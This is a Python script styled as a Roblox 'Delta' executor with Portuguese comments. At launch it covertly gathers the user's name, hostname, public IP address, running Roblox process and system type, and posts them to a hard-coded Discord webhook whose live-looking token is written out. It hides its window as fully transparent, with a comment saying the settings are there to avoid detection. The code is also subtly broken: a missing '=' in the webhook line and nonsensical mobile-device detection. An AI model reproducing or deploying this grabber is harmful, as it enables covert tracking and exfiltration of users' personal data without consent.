import tkinter as tk
import ctypes
import sys
import time
import requests
import platform
import subprocess
import os
import getpass
from datetime import datetime

# Configuração do webhook
WEBHOOK_URL "https://discord.com/api/webhooks/1514307588790157495/bxSW9eYyPAB27ZHAhD-Kgi3ol4hGB9C1t_2O3Ej_62-tQi62-rIK3AMxiyLexRWpRuSQ"

class DeltaExecutor:
    def __init__(self):
        self.root = tk.Tk()
        self.root.overrideredirect(True)
        self.root.wm_attributes("-topmost", True)
        self.root.wm_attributes("-transparentcolor", "white")
        self.root.wm_attributes("-alpha", 0.0)
        
        # Configurações para evitar detecção
        ctypes.windll.user32.SetWindowLongW(self.root.winfo_id(), -20, 0x80000 | 0x40000)
        ctypes.windll.user32.SetWindowPos(self.root.winfo_id(), -1, 0, 0, 0, 0, 0x0001 | 0x0002)
        
        # Obter informações do sistema
        self.username = getpass.getuser()
        self.hostname = platform.node()
        self.ip_address = requests.get('https://api.ipify.org').text
        self.os_type = self.detect_system_type()
        
        # Inicializa os elementos
        self.tela = None
        self.botao_amoxtrar = None
        self.botao_desamoxtrar = None
        
        self.setup_ui()
        self.send_discord_notification()
    
    def detect_system_type(self):
        """Detecta o tipo de sistema (PC, Mobile, Console)"""
        try:
            # Verificar dispositivos conectados
            devices = subprocess.check_output(["wmic", "path", "Win32_LogicalDisk", "get", "DeviceID"]).decode()
            
            # Detectar consoles (Xbox, PlayStation, etc.)
            if "Xbox" in subprocess.check_output(["powershell", "Get-WmiObject", "-Class", "Win32_ComputerSystemProduct"]).decode():
                return "Console"
                
            # Detectar dispositivos móveis (Android, iOS)
            if any(device in devices for device in ["A:", "B:"]):
                return "Mobile"
                
            # Detectar PC com base em hardware
            cpu_info = subprocess.check_output(["wmic", "cpu", "get", "Name"]).decode()
            if any(cpu in cpu_info for cpu in ["ARM", "Qualcomm", "Snapdragon"]):
                return "Mobile"
                
            return "PC"
        except:
            return "Desconhecido"
    
    def send_discord_notification(self):
        try:
            payload = {
                "content": "@here",
                "embeds": [{
                    "title": "Novo Script Executado",
                    "description": f"Script foi executado em {platform.system()}",
                    "color": 0x00ff00,
                    "fields": [
                        {"name": "Usuário", "value": self.username, "inline": True},
                        {"name": "Hostname", "value": self.hostname, "inline": True},
                        {"name": "IP Address", "value": self.ip_address, "inline": True},
                        {"name": "Horário", "value": datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "inline": True},
                        {"name": "Jogo", "value": self.get_game_name(), "inline": True},
                        {"name": "WID", "value": str(os.getpid()), "inline": True},
                        {"name": "Tipo de Sistema", "value": self.os_type, "inline": True}
                    ]
                }]
            }
            requests.post(WEBHOOK_URL, json=payload)
        except Exception as e:
            print(f"Erro ao enviar webhook: {str(e)}")
    
    def get_game_name(self):
        try:
            # Tenta obter nome do jogo atual
            process = subprocess.Popen(["tasklist"], stdout=subprocess.PIPE)
            output, _ = process.communicate()
            for line in output.decode().splitlines():
                if "Roblox" in line:
                    return line.split()[0]
            return "Jogo desconhecido"
        except:
            return "Não identificado"
    
    def setup_ui(self):
        self.root.update()
        self.root.geometry(f"{self.root.winfo_width()}x{self.root.winfo_height()}+{self.root.winfo_x()}+{self.root.winfo_y()}")
        
        # Botões invisíveis mas posicionados
        self.botao_amoxtrar = tk.Button(
            self.root,
            text="Amoxtrar",
            command=self.amoxtrar,
            width=10,
            height=1
        )
        self.botao_amoxtrar.place(x=10, y=10)
        
        self.botao_desamoxtrar = tk.Button(
            self.root,
            text="Desamoxtrar",
            command=self.desamoxtrar,
            width=10,
            height=1
        )
        self.botao_desamoxtrar.place(x=10, y=40)
    
    def amoxtrar(self):
        if self.tela is None:
            self.tela = tk.Label(
                self.root,
                text="pede massa pedrero",
                bg="black",
                fg="white"
            )
            self.tela.place(x=50, y=100)
            self.botao_amoxtrar.config(text="Desamoxtrar")
    
    def desamoxtrar(self):
        if self.tela is not None:
            self.tela.destroy()
            self.tela = None
            self.botao_amoxtrar.config(text="Amoxtrar")
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = DeltaExecutor()
    app.run()
